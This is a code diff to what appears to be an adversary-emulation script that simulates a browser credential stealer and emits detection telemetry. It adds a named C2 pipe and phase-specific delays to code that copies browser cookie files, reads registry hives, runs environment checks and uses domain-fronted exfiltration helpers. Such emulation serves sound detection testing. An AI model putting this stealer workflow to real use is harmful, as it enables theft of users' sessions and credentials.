@@ -24,8 +24,9 @@ import time
 from datetime import datetime, timezone
 from pathlib import Path
 
-from telemetry_helper import check_environment, emit, EnvSafety, set_phase, jitter
+from telemetry_helper import check_environment, emit, EnvSafety, set_phase
 from c2_helper import emit_doh_query, emit_heartbeats, fronted_beacon, jittered_sleep, FRONT_DOMAINS
+from naming_helper import phase_delay, pick_pipe, emit_pipe
 
 
 EXFIL_SERVERS = ["10.13.37.50", "10.13.37.51"]
@@ -52,6 +53,10 @@ def main() -> int:
              source_process="stealer.exe", early_exit="COMPROMISED environment")
         return 0
 
+    c2_pipe = pick_pipe()
+    emit_pipe(c2_pipe, "stealer.exe")
+    time.sleep(phase_delay("pipe_create"))
+
     user = os.environ.get("USERPROFILE", r"C:\Users\guestuser")
     local_appdata = os.environ.get("LOCALAPPDATA", f"{user}\\AppData\\Local")
 
@@ -75,7 +80,7 @@ def main() -> int:
             emit("FILE", "READ_FILE", str(profile_path), "CRITICAL",
                  source_process="stealer.exe", browser=browser, exists=True,
                  detail=f"{browser} profile FOUND", technique_id="T1217")
-        jitter(0.2, 0.2)
+        time.sleep(phase_delay("browser_scan"))
 
     # --- Phase 2: Credential Database Access ---
     set_phase("credential_theft")
@@ -106,7 +111,7 @@ def main() -> int:
                      detail=f"Copied {browser} Cookies (session tokens)", technique_id="T1539")
             except Exception:
                 pass
-        jitter(0.15, 0.15)
+        time.sleep(phase_delay("file_read"))
 
     # --- Phase 3: Registry Hive Access ---
     if env != EnvSafety.SUSPICIOUS:
@@ -127,7 +132,7 @@ def main() -> int:
                     capture_output=True, timeout=5)
             except Exception:
                 pass
-            jitter(0.15, 0.15)
+            time.sleep(phase_delay("registry_read"))
 
     # --- Phase 4: Dropper (domain-fronted) ---
     set_phase("dropper")
